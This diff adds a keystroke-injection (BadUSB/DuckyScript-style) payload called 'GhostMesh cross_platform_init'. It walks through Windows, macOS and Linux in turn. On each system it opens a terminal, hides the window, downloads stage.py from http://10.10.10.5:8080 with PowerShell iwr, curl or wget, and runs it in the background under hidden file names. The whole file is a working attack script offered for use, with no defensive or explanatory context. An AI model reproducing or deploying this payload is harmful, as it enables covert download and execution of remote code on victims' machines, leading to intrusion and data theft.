@@ -1,0 +1,54 @@
+REM GhostMesh payload — cross_platform_init
+REM Three-stanza OS-detection walk. Each terminal chord is inert on the wrong OS.
+DELAY 2000
+
+REM ------------------------------------------------------------
+REM Stanza 1 — Windows (GUI+r → powershell → pythonw)
+REM 600ms: Win+R dialog render  |  200ms: command echo settle
+REM ------------------------------------------------------------
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "
+ENTER
+DELAY 200
+STRING $s=\"$env:TEMP\stage.py\";iwr -Uri http://10.10.10.5:8080/stage.py -OutFile $s -UseBasicParsing;
+ENTER
+STRING if(Test-Path $s){Start-Process pythonw -ArgumentList $s -WindowStyle Hidden};
+ENTER
+STRING exit
+ENTER
+DELAY 400
+
+REM ------------------------------------------------------------
+REM Stanza 2 — macOS (GUI+Space → Spotlight → Terminal → curl → python3)
+REM 800ms: Spotlight appear  |  1200ms: Terminal.app spawn  |  200ms: command settle
+REM ------------------------------------------------------------
+GUI SPACE
+DELAY 800
+STRING terminal
+ENTER
+DELAY 1200
+STRING osascript -e 'tell app \"Terminal\" to set visible of front window to false';
+ENTER
+DELAY 200
+STRING curl -s -o /tmp/.stage.py http://10.10.10.5:8080/stage.py && python3 /tmp/.stage.py &
+ENTER
+DELAY 300
+STRING osascript -e 'tell app \"Terminal\" to quit'
+ENTER
+DELAY 400
+
+REM ------------------------------------------------------------
+REM Stanza 3 — Linux (CTRL+ALT+T → bash → wget → python3)
+REM 800ms: terminal window spawn  |  200ms: command settle
+REM ------------------------------------------------------------
+CTRL ALT T
+DELAY 800
+STRING bash -c 'wget -q -O /tmp/.stage.py http://10.10.10.5:8080/stage.py && python3 /tmp/.stage.py &' &
+ENTER
+DELAY 200
+STRING exit
+ENTER
+
+DELAY 200
+ESC
